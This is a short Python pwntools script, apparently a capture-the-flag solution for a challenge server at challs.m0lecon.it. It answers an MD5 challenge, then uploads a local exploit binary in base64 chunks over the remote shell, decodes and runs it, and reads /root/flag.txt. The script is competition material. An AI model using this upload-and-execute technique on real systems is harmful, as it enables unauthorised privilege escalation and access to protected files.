from pwn import *
from hashlib import md5
from base64 import b64encode
import os

context.log_level = "DEBUG"

def send_exp(exp):
    SZ = 128
    for i in range(0, len(exp), SZ):
        chunk = exp[i: min(i + SZ, len(exp))]
        print(chunk.decode())
        cmd = "echo %s >> exp.base64" % chunk.decode()
        p.sendline(cmd)

if __name__ == "__main__":
    with open("./exp", "rb") as f:
        exp = b64encode(f.read())
    p = remote("challs.m0lecon.it", 9012)
    quiz = p.recvline().split(b" ")[2]
    success(quiz)
    p.sendline(md5(quiz).hexdigest())
    p.recvuntil("Baby initialized!")
    
    p.sendline("cd /home/user")
    send_exp(exp)
    p.sendline("cat exp.base64 | base64 -d  > exp")
    p.sendline("chmod +x exp")
    p.sendline("./exp")
    p.sendline("cat /root/flag.txt")
    p.interactive()